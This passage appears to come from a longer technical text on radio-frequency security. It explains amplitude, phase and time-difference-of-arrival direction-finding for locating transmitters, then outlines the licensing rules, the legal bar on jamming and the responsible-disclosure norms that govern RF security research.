Direction-finding enables localization of transmitters through multi-antenna systems that measure angle-of-arrival or time-difference-of-arrival from spatially-separated observation points. Amplitude-based direction-finding compares received signal strength across directional antennas with overlapping coverage patterns, inferring source direction from the ratio of amplitudes—rotating Yagi antennas achieve typical accuracies of 5-10 degrees. Phase-based techniques exploit the differential phase shift experienced by wavefronts arriving at antenna elements separated by known baselines, computing angle through arctangent of the measured phase differences—uniform circular arrays with 8-16 elements provide omnidirectional coverage with 1-2 degree accuracy. Time-difference-of-arrival (TDOA) systems correlate signals captured at geographically-separated receivers, computing hyperbolic location surfaces from measured time delays—three or more receivers enable two-dimensional localization, while four or more provide three-dimensional positioning with accuracies limited by timing precision and geometric dilution of precision.

The legal and ethical dimensions of RF security research impose constraints on testing methodologies and disclosure practices that distinguish legitimate security research from malicious activity. Radio transmissions in occupied spectrum require appropriate licensing from regulatory authorities—FCC in the United States, Ofcom in the United Kingdom—or operation under exemptions like the Part 15 unlicensed bands or experimental licenses explicitly authorizing security research. Passive monitoring generally enjoys fewer restrictions since receiving electromagnetic radiation constitutes protected activity under free speech principles in most jurisdictions, but active attacks like jamming violate communications acts prohibiting intentional interference with authorized services. Responsible disclosure practices balance informing vendors and users about discovered vulnerabilities against withholding technical details that would enable widespread exploitation, typically providing 90-day embargoes for vendors to develop patches before public disclosure.
